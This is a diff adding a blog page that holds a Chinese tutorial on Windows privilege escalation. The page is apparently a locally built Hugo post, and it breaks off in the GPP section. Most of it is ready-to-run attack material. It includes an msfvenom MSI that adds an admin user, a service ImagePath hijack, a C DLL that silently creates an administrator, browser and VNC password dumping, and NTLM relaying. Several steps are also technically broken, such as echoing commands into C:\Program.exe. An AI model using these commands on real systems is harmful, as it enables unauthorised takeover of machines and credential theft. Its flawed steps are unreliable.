@@ -1,0 +1,1047 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Windows提权 | H4ck3r Station</title>
+<meta name="keywords" content="">
+<meta name="description" content="Windows工作组环境和域环境提权方式详解
+一、工作组环境提权方式
+1. AlwaysInstallElevated提权
+条件：
+
+系统已启用AlwaysInstallElevated（注册表值为1）
+
+检查方法：
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+利用步骤：
+
+
+生成恶意MSI文件（在Kali Linux中）：
+msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd -f msi -o add.msi
+如果在Windows上操作，可以使用在线工具生成MSI文件
+
+
+在Windows上执行：
+msiexec /i add.msi
+
+
+验证提权：
+net user hacker
+
+
+成功标志：看到hacker账户，且在管理员组中
+
+2. 服务权限配置错误提权
+条件：
+
+服务路径权限配置错误
+当前用户对服务可执行文件或目录有写权限
+
+检查方法：
+sc query
+winpeas.exe quiet notcolor serviceinfo
+利用步骤：
+
+
+找到一个服务（如Spooler）：
+sc qc Spooler
+
+
+修改服务路径：
+reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&#34; /t REG_EXPAND_SZ /v ImagePath /d &#34;C:\evil\shell.exe&#34; /f
+
+
+重启服务：">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="H4ck3r Station (Alt + H)">H4ck3r Station</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="档案">
+                    <span>档案</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Windows提权
+    </h1>
+    <div class="post-meta"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>4 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#windows%e5%b7%a5%e4%bd%9c%e7%bb%84%e7%8e%af%e5%a2%83%e5%92%8c%e5%9f%9f%e7%8e%af%e5%a2%83%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f%e8%af%a6%e8%a7%a3" aria-label="Windows工作组环境和域环境提权方式详解">Windows工作组环境和域环境提权方式详解</a><ul>
+                        
+                <li>
+                    <a href="#%e4%b8%80%e5%b7%a5%e4%bd%9c%e7%bb%84%e7%8e%af%e5%a2%83%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f" aria-label="一、工作组环境提权方式">一、工作组环境提权方式</a><ul>
+                        
+                <li>
+                    <a href="#1-alwaysinstallelevated%e6%8f%90%e6%9d%83" aria-label="1. AlwaysInstallElevated提权">1. AlwaysInstallElevated提权</a></li>
+                <li>
+                    <a href="#2-%e6%9c%8d%e5%8a%a1%e6%9d%83%e9%99%90%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af%e6%8f%90%e6%9d%83" aria-label="2. 服务权限配置错误提权">2. 服务权限配置错误提权</a></li>
+                <li>
+                    <a href="#3-%e6%9c%aa%e5%bc%95%e7%94%a8%e7%9a%84%e6%9c%8d%e5%8a%a1%e8%b7%af%e5%be%84%e6%8f%90%e6%9d%83" aria-label="3. 未引用的服务路径提权">3. 未引用的服务路径提权</a></li>
+                <li>
+                    <a href="#4-dll%e5%8a%ab%e6%8c%81%e6%8f%90%e6%9d%83" aria-label="4. DLL劫持提权">4. DLL劫持提权</a></li>
+                <li>
+                    <a href="#5-serv-u-ftp%e6%9c%8d%e5%8a%a1%e6%8f%90%e6%9d%83" aria-label="5. Serv-U FTP服务提权">5. Serv-U FTP服务提权</a></li>
+                <li>
+                    <a href="#6-%e5%af%86%e7%a0%81%e6%94%b6%e9%9b%86%e6%8f%90%e6%9d%83" aria-label="6. 密码收集提权">6. 密码收集提权</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%8c%e5%9f%9f%e7%8e%af%e5%a2%83%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f" aria-label="二、域环境提权方式">二、域环境提权方式</a><ul>
+                        
+                <li>
+                    <a href="#1-ntlm%e4%b8%ad%e7%bb%a7%e6%8f%90%e6%9d%83" aria-label="1. NTLM中继提权">1. NTLM中继提权</a></li>
+                <li>
+                    <a href="#2-gpp%e7%bb%84%e7%ad%96%e7%95%a5%e9%a6%96%e9%80%89%e9%a1%b9%e6%8f%90%e6%9d%83" aria-label="2. GPP组策略首选项提权">2. GPP组策略首选项提权</a></li>
+                <li>
+                    <a href="#3-cve-2020-1472%e6%8f%90%e6%9d%83zerologon" aria-label="3. CVE-2020-1472提权（Zerologon）">3. CVE-2020-1472提权（Zerologon）</a></li>
+                <li>
+                    <a href="#4-ms14-068%e6%8f%90%e6%9d%83" aria-label="4. MS14-068提权">4. MS14-068提权</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b8%89%e6%8f%90%e6%9d%83%e5%89%8d%e5%bf%85%e5%a4%87%e6%a3%80%e6%9f%a5" aria-label="三、提权前必备检查">三、提权前必备检查</a></li>
+                <li>
+                    <a href="#%e5%9b%9b%e6%8f%90%e6%9d%83%e6%88%90%e5%8a%9f%e5%90%8e" aria-label="四、提权成功后">四、提权成功后</a></li>
+                <li>
+                    <a href="#%e4%ba%94%e6%8f%90%e6%9d%83%e5%b0%8f%e6%8a%80%e5%b7%a7" aria-label="五、提权小技巧">五、提权小技巧</a></li>
+                <li>
+                    <a href="#%e9%99%84%e5%bd%95%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f%e5%bf%ab%e9%80%9f%e5%af%b9%e7%85%a7%e8%a1%a8" aria-label="附录：提权方式快速对照表">附录：提权方式快速对照表</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e6%a0%b9%e6%8d%ae%e5%91%bd%e4%bb%a4%e7%bb%93%e6%9e%9c%e9%80%89%e6%8b%a9%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f%e7%9a%84%e5%ae%9e%e6%88%98%e6%8c%87%e5%8d%97" aria-label="根据命令结果选择提权方式的实战指南">根据命令结果选择提权方式的实战指南</a><ul>
+                        
+                <li>
+                    <a href="#%e4%b8%80%e5%91%bd%e4%bb%a4%e7%bb%93%e6%9e%9c%e5%88%86%e6%9e%90%e4%b8%8e%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f%e9%80%89%e6%8b%a9" aria-label="一、命令结果分析与提权方式选择">一、命令结果分析与提权方式选择</a><ul>
+                        
+                <li>
+                    <a href="#1-whoami-priv-%e7%bb%93%e6%9e%9c%e5%88%86%e6%9e%90" aria-label="1. whoami /priv 结果分析">1. whoami /priv 结果分析</a></li>
+                <li>
+                    <a href="#2-sc-query-%e7%bb%93%e6%9e%9c%e5%88%86%e6%9e%90" aria-label="2. sc query 结果分析">2. sc query 结果分析</a></li>
+                <li>
+                    <a href="#3-icacls-c-%e7%bb%93%e6%9e%9c%e5%88%86%e6%9e%90" aria-label="3. icacls C:\ 结果分析">3. icacls C:\ 结果分析</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%8c%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f%e9%80%89%e6%8b%a9%e6%b5%81%e7%a8%8b%e5%9b%be" aria-label="二、提权方式选择流程图">二、提权方式选择流程图</a></li>
+                <li>
+                    <a href="#%e4%b8%89%e5%ae%9e%e6%88%98%e6%a1%88%e4%be%8b%e5%88%86%e6%9e%90" aria-label="三、实战案例分析">三、实战案例分析</a><ul>
+                        
+                <li>
+                    <a href="#%e6%a1%88%e4%be%8b1whoami-priv-%e6%98%be%e7%a4%ba%e6%9c%89seimpersonateprivilege" aria-label="案例1：whoami /priv 显示有SeImpersonatePrivilege">案例1：whoami /priv 显示有SeImpersonatePrivilege</a></li>
+                <li>
+                    <a href="#%e6%a1%88%e4%be%8b2sc-query-%e6%98%be%e7%a4%ba%e6%9c%89%e6%9c%8d%e5%8a%a1%e8%b7%af%e5%be%84%e5%8c%85%e5%90%ab%e7%a9%ba%e6%a0%bc" aria-label="案例2：sc query 显示有服务路径包含空格">案例2：sc query 显示有服务路径包含空格</a></li>
+                <li>
+                    <a href="#%e6%a1%88%e4%be%8b3icacls-c-%e6%98%be%e7%a4%ba-everyonef" aria-label="案例3：icacls C:\ 显示 Everyone:(F)">案例3：icacls C:\ 显示 Everyone:(F)</a></li>
+                <li>
+                    <a href="#%e6%a1%88%e4%be%8b4sc-query-%e6%98%be%e7%a4%ba%e6%9c%89%e6%9c%8d%e5%8a%a1%e6%9d%83%e9%99%90%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af" aria-label="案例4：sc query 显示有服务权限配置错误">案例4：sc query 显示有服务权限配置错误</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%9b%9b%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f%e4%bc%98%e5%85%88%e7%ba%a7%e6%8e%92%e5%ba%8f" aria-label="四、提权方式优先级排序">四、提权方式优先级排序</a></li>
+                <li>
+                    <a href="#%e4%ba%94%e6%8f%90%e6%9d%83%e5%89%8d%e5%bf%85%e5%81%9a%e6%a3%80%e6%9f%a5%e6%b8%85%e5%8d%95" aria-label="五、提权前必做检查清单">五、提权前必做检查清单</a></li>
+                <li>
+                    <a href="#%e5%85%ad%e5%ae%9e%e6%88%98%e6%8a%80%e5%b7%a7" aria-label="六、实战技巧">六、实战技巧</a></li>
+                <li>
+                    <a href="#%e6%80%bb%e7%bb%93%e6%8f%90%e6%9d%83%e4%b8%89%e6%ad%a5" aria-label="总结：提权三步">总结：提权三步</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="windows工作组环境和域环境提权方式详解">Windows工作组环境和域环境提权方式详解<a hidden class="anchor" aria-hidden="true" href="#windows工作组环境和域环境提权方式详解">#</a></h1>
+<h2 id="一工作组环境提权方式">一、工作组环境提权方式<a hidden class="anchor" aria-hidden="true" href="#一工作组环境提权方式">#</a></h2>
+<h3 id="1-alwaysinstallelevated提权">1. AlwaysInstallElevated提权<a hidden class="anchor" aria-hidden="true" href="#1-alwaysinstallelevated提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>系统已启用AlwaysInstallElevated（注册表值为1）</li>
+</ul>
+<p><strong>检查方法</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span><span style="display:flex;"><span>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span></code></pre></div><p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>生成恶意MSI文件（在Kali Linux中）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd -f msi -o add.msi
+</span></span></code></pre></div><p><em>如果在Windows上操作，可以使用在线工具生成MSI文件</em></p>
+</li>
+<li>
+<p>在Windows上执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>msiexec /i add.msi
+</span></span></code></pre></div></li>
+<li>
+<p>验证提权：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>net user hacker
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：看到hacker账户，且在管理员组中</p>
+<hr>
+<h3 id="2-服务权限配置错误提权">2. 服务权限配置错误提权<a hidden class="anchor" aria-hidden="true" href="#2-服务权限配置错误提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>服务路径权限配置错误</li>
+<li>当前用户对服务可执行文件或目录有写权限</li>
+</ul>
+<p><strong>检查方法</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc query
+</span></span><span style="display:flex;"><span>winpeas.exe quiet notcolor serviceinfo
+</span></span></code></pre></div><p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>找到一个服务（如Spooler）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc qc Spooler
+</span></span></code></pre></div></li>
+<li>
+<p>修改服务路径：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&#34;</span> /t REG_EXPAND_SZ /v ImagePath /d <span style="color:#e6db74">&#34;C:\evil\shell.exe&#34;</span> /f
+</span></span></code></pre></div></li>
+<li>
+<p>重启服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>net stop Spooler
+</span></span><span style="display:flex;"><span>net start Spooler
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：<code>shell.exe</code>以系统权限运行</p>
+<hr>
+<h3 id="3-未引用的服务路径提权">3. 未引用的服务路径提权<a hidden class="anchor" aria-hidden="true" href="#3-未引用的服务路径提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ol>
+<li>服务路径没有用引号引起来</li>
+<li>服务路径中存在空格</li>
+<li>服务以最高权限启动</li>
+<li>当前用户对路径有写权限</li>
+</ol>
+<p><strong>检查方法</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc query
+</span></span><span style="display:flex;"><span>winpeas.exe quiet notcolor serviceinfo
+</span></span><span style="display:flex;"><span>icacls <span style="color:#e6db74">&#34;C:\&#34;</span>
+</span></span></code></pre></div><p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>创建服务（需要管理员权限）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc create <span style="color:#e6db74">&#34;service&#34;</span> binpath= <span style="color:#e6db74">&#34;C:\Program Files\Common Files\test.exe&#34;</span> start= auto
+</span></span></code></pre></div></li>
+<li>
+<p>检查服务权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc qc service
+</span></span></code></pre></div></li>
+<li>
+<p>给用户写权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>icacls <span style="color:#e6db74">&#34;C:\Program Files\Common Files&#34;</span> /grant Users:(OI)(CI)F /T
+</span></span></code></pre></div></li>
+<li>
+<p>在C盘创建恶意文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> net user hacker P@ssw0rd /add &gt; C:\Program.exe
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> net localgroup administrators hacker /add &gt;&gt; C:\Program.exe
+</span></span></code></pre></div></li>
+<li>
+<p>重启服务（等待自动启动）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>net stop service
+</span></span><span style="display:flex;"><span>net start service
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：<code>hacker</code>账户被添加为管理员</p>
+<hr>
+<h3 id="4-dll劫持提权">4. DLL劫持提权<a hidden class="anchor" aria-hidden="true" href="#4-dll劫持提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>目标程序会加载DLL</li>
+<li>当前用户对程序目录有写权限</li>
+</ul>
+<p><strong>检查方法</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>procmon.exe /accepteula /quiet /minimized /background /d <span style="color:#e6db74">&#34;C:\procmon.log&#34;</span> /n <span style="color:#e6db74">&#34;Service.exe&#34;</span>
+</span></span></code></pre></div><p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>找到目标程序（如notepad.exe）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>where notepad
+</span></span></code></pre></div></li>
+<li>
+<p>创建恶意DLL（使用Visual Studio）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>BOOL WINAPI <span style="color:#a6e22e">DllMain</span>(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WinExec</span>(<span style="color:#e6db74">&#34;net user hacker P@ssw0rd /add&#34;</span>, SW_HIDE);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WinExec</span>(<span style="color:#e6db74">&#34;net localgroup administrators hacker /add&#34;</span>, SW_HIDE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p>将DLL放到目标程序目录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">copy</span> evil.dll <span style="color:#e6db74">&#34;C:\Program Files\Notepad\&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>重启目标程序：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>taskkill /f /im notepad.exe
+</span></span><span style="display:flex;"><span>notepad.exe
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：<code>hacker</code>账户被添加为管理员</p>
+<hr>
+<h3 id="5-serv-u-ftp服务提权">5. Serv-U FTP服务提权<a hidden class="anchor" aria-hidden="true" href="#5-serv-u-ftp服务提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>Serv-U FTP服务已安装</li>
+<li>Serv-U安装目录可写</li>
+</ul>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>下载ServUDaemon.ini：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>wget http://目标IP/ServUDaemon.ini
+</span></span></code></pre></div></li>
+<li>
+<p>修改配置文件（添加管理员用户）：</p>
+<pre tabindex="0"><code>[Users]
+User=hacker
+Password=P@ssw0rd
+Group=Administrators
+Directory=C:\
+</code></pre></li>
+<li>
+<p>上传修改后的文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>upload ServUDaemon.ini
+</span></span></code></pre></div></li>
+<li>
+<p>用新账户登录FTP：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>ftp 192.168.1.100
+</span></span><span style="display:flex;"><span>User: hacker
+</span></span><span style="display:flex;"><span>Password: P@ssw0rd
+</span></span></code></pre></div></li>
+<li>
+<p>验证提权：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>quote site exec net user admin P@ssw0rd /add
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：成功添加新管理员账户</p>
+<hr>
+<h3 id="6-密码收集提权">6. 密码收集提权<a hidden class="anchor" aria-hidden="true" href="#6-密码收集提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>浏览器保存了密码</li>
+<li>有VNC密码</li>
+</ul>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>浏览器密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>WebBrowserPassView.exe /shtml <span style="color:#e6db74">&#34;C:\passwords.html&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>VNC密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>reg query HKEY_CURRENT_USER\Software\TightVNC\Server
+</span></span><span style="display:flex;"><span>vncpwd.exe <span style="color:#e6db74">&#34;加密密码&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>使用获取的密码提权：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>runas /user:domain\administrator <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：使用获取的密码获取管理员权限</p>
+<hr>
+<h2 id="二域环境提权方式">二、域环境提权方式<a hidden class="anchor" aria-hidden="true" href="#二域环境提权方式">#</a></h2>
+<h3 id="1-ntlm中继提权">1. NTLM中继提权<a hidden class="anchor" aria-hidden="true" href="#1-ntlm中继提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>能获取Net-NTLM Hash</li>
+<li>域用户是域管理员组成员</li>
+</ul>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>获取Net-NTLM Hash：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>responder -I eth0 -wrf
+</span></span></code></pre></div></li>
+<li>
+<p>使用NTLM中继：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>ntlmrelayx.py -t 192.168.1.100 -smb2support
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：获得域控制器的访问权限</p>
+<hr>
+<h3 id="2-gpp组策略首选项提权">2. GPP组策略首选项提权<a hidden class="anchor" aria-hidden="true" href="#2-gpp组策略首选项提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>域环境</li>
+<li>组策略首选项配置错误</li>
+</ul>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>找到加密密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">dir</span> \\域控制器\SYSVOL\domain.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups
+</span></span></code></pre></div></li>
+<li>
+<p>解密密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>gpp-decrypt.py <span style="color:#e6db74">&#34;加密密码&#34;</span>
+</span></span></code></pre></div></li>
+<li>
